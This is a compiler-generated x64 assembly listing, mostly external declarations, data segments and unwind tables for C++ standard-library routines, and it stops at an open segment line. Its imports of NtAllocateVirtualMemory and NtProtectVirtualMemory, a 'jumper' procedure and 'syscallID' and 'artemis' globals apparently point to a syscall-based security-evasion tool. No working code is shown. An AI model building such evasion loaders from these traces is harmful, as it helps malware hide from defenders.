EXTRN	_Getwctypes:PROC
EXTRN	_Towlower:PROC
EXTRN	_Towupper:PROC
EXTRN	?_Locinfo_ctor@_Locinfo@std@@SAXPEAV12@PEBD@Z:PROC ; std::_Locinfo::_Locinfo_ctor
EXTRN	?_Locinfo_dtor@_Locinfo@std@@SAXPEAV12@@Z:PROC	; std::_Locinfo::_Locinfo_dtor
EXTRN	??_Efacet@locale@std@@MEAAPEAXI@Z:PROC		; std::locale::facet::`vector deleting destructor'
EXTRN	?_Getgloballocale@locale@std@@CAPEAV_Locimp@12@XZ:PROC ; std::locale::_Getgloballocale
EXTRN	??_Ectype_base@std@@UEAAPEAXI@Z:PROC		; std::ctype_base::`vector deleting destructor'
EXTRN	??_E?$ctype@D@std@@MEAAPEAXI@Z:PROC		; std::ctype<char>::`vector deleting destructor'
EXTRN	??_E?$ctype@_W@std@@MEAAPEAXI@Z:PROC		; std::ctype<wchar_t>::`vector deleting destructor'
EXTRN	??_Efailure@ios_base@std@@UEAAPEAXI@Z:PROC	; std::ios_base::failure::`vector deleting destructor'
EXTRN	__imp_GetCurrentProcess:PROC
EXTRN	__imp_VirtualFree:PROC
EXTRN	NtAllocateVirtualMemory:PROC
EXTRN	NtProtectVirtualMemory:PROC
EXTRN	jumper:PROC
EXTRN	??_E?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z:PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`vector deleting destructor'
EXTRN	??_E?$numpunct@D@std@@MEAAPEAXI@Z:PROC		; std::numpunct<char>::`vector deleting destructor'
EXTRN	_CxxThrowException:PROC
EXTRN	__CxxFrameHandler4:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__GSHandlerCheck_EH4:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	??_7type_info@@6B@:BYTE				; type_info::`vftable'
EXTRN	?_Id_cnt@id@locale@std@@0HA:DWORD		; std::locale::id::_Id_cnt
EXTRN	?id@?$ctype@D@std@@2V0locale@2@A:QWORD		; std::ctype<char>::id
EXTRN	?id@?$ctype@_W@std@@2V0locale@2@A:QWORD		; std::ctype<wchar_t>::id
EXTRN	?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:BYTE ; std::cout
EXTRN	?wcout@std@@3V?$basic_ostream@_WU?$char_traits@_W@std@@@1@A:BYTE ; std::wcout
EXTRN	__security_cookie:QWORD
EXTRN	_fltused:DWORD
;	COMDAT ?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA
_BSS	SEGMENT
?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA DQ 01H DUP (?) ; `__local_stdio_printf_options'::`2'::_OptionsStorage
_BSS	ENDS
_BSS	SEGMENT
?artemis@@3VArtemis@@A DB 0108H DUP (?)			; artemis
?syscallID@@3HA DD 01H DUP (?)				; syscallID
_BSS	ENDS
;	COMDAT ?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A
_BSS	SEGMENT
?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A DQ 01H DUP (?) ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::id
_BSS	ENDS
;	COMDAT ?id@?$numpunct@D@std@@2V0locale@2@A
_BSS	SEGMENT
?id@?$numpunct@D@std@@2V0locale@2@A DQ 01H DUP (?)	; std::numpunct<char>::id
_BSS	ENDS
;	COMDAT ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PEBVfacet@locale@2@EB
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PEBVfacet@locale@2@EB DQ 01H DUP (?) ; std::_Facetptr<std::ctype<char> >::_Psave
_BSS	ENDS
;	COMDAT ?_Psave@?$_Facetptr@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@2PEBVfacet@locale@2@EB
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@2PEBVfacet@locale@2@EB DQ 01H DUP (?) ; std::_Facetptr<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >::_Psave
_BSS	ENDS
;	COMDAT ?_Psave@?$_Facetptr@V?$numpunct@D@std@@@std@@2PEBVfacet@locale@2@EB
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$numpunct@D@std@@@std@@2PEBVfacet@locale@2@EB DQ 01H DUP (?) ; std::_Facetptr<std::numpunct<char> >::_Psave
_BSS	ENDS
;	COMDAT ?_Psave@?$_Facetptr@V?$ctype@_W@std@@@std@@2PEBVfacet@locale@2@EB
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$ctype@_W@std@@@std@@2PEBVfacet@locale@2@EB DQ 01H DUP (?) ; std::_Facetptr<std::ctype<wchar_t> >::_Psave
_BSS	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$fabsl DD	imagerel $LN3
	DD	imagerel $LN3+26
	DD	imagerel $unwind$fabsl
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$frexpl DD imagerel $LN3
	DD	imagerel $LN3+36
	DD	imagerel $unwind$frexpl
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$_vfprintf_l DD imagerel $LN3
	DD	imagerel $LN3+67
	DD	imagerel $unwind$_vfprintf_l
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$printf DD imagerel $LN3
	DD	imagerel $LN3+87
	DD	imagerel $unwind$printf
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$_vsprintf_s_l DD imagerel $LN5
	DD	imagerel $LN5+110
	DD	imagerel $unwind$_vsprintf_s_l
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$sprintf_s DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$sprintf_s
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$wmemcmp DD imagerel $LN9
	DD	imagerel $LN9+140
	DD	imagerel $unwind$wmemcmp
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+99
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@QEBDH@Z DD imagerel $LN3
	DD	imagerel $LN3+73
	DD	imagerel $unwind$??0exception@std@@QEAA@QEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+88
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1exception@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??1exception@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?what@exception@std@@UEBAPEBDXZ DD imagerel $LN5
	DD	imagerel $LN5+56
	DD	imagerel $unwind$?what@exception@std@@UEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@AEAA@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+60
	DD	imagerel $unwind$??0bad_alloc@std@@AEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_alloc@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1bad_alloc@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1bad_array_new_length@std@@UEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??1bad_array_new_length@std@@UEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+36
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD imagerel $LN11
	DD	imagerel $LN11+153
	DD	imagerel $unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+55
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+55
	DD	imagerel $unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?compare@?$_WChar_traits@_W@std@@SAHQEB_W0_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?find@?$_WChar_traits@_W@std@@SAPEB_WPEB_W_KAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z DD imagerel $LN5
	DD	imagerel $LN5+59
	DD	imagerel $unwind$?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?copy@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?move@?$_Char_traits@DH@std@@SAPEADQEADQEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$?assign@?$_Narrow_char_traits@DH@std@@SAPEADQEAD_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z DD imagerel $LN5
	DD	imagerel $LN5+55
	DD	imagerel $unwind$?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NAEBH0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+21
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+39
	DD	imagerel $unwind$?deallocate@?$allocator@D@std@@QEAAXQEAD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@D@std@@QEAAPEAD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$?allocate@?$allocator@D@std@@QEAAPEAD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+58
	DD	imagerel $unwind$??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+64
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ DD imagerel $LN4
	DD	imagerel $LN4+64
	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+46
	DD	imagerel $unwind$?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ DD imagerel $LN3
	DD	imagerel $LN3+21
	DD	imagerel $unwind$?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+67
	DD	imagerel $unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+102
	DD	imagerel $unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA DD imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z DD imagerel $LN4
	DD	imagerel $LN4+69
	DD	imagerel $unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA DD imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+80
	DD	imagerel $unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA DD imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z DD imagerel $LN4
	DD	imagerel $LN4+69
	DD	imagerel $unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA DD imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+126
	DD	imagerel $unwind$??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$?_Memcpy_val_from@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z DD imagerel $LN5
	DD	imagerel $LN5+236
	DD	imagerel $unwind$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z DD imagerel $LN3
	DD	imagerel $LN3+38
	DD	imagerel $unwind$??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z DD imagerel $LN3
	DD	imagerel $LN3+54
	DD	imagerel $unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@AEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z DD imagerel $LN4
	DD	imagerel $LN4+250
	DD	imagerel $unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+55
	DD	imagerel $unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@QEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z DD imagerel $LN4
	DD	imagerel $LN4+250
	DD	imagerel $unwind$?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z DD imagerel $LN4
	DD	imagerel $LN4+293
	DD	imagerel $unwind$?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?clear@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z DD imagerel $LN3
	DD	imagerel $LN3+37
	DD	imagerel $unwind$??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAAEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z DD imagerel $LN4
	DD	imagerel $LN4+193
	DD	imagerel $unwind$?push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ DD imagerel $LN3
	DD	imagerel $LN3+27
	DD	imagerel $unwind$?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+110
	DD	imagerel $unwind$?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z DD imagerel $LN5
	DD	imagerel $LN5+103
	DD	imagerel $unwind$?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAX_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+46
	DD	imagerel $unwind$?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z DD imagerel $LN3
	DD	imagerel $LN3+96
	DD	imagerel $unwind$?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+146
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
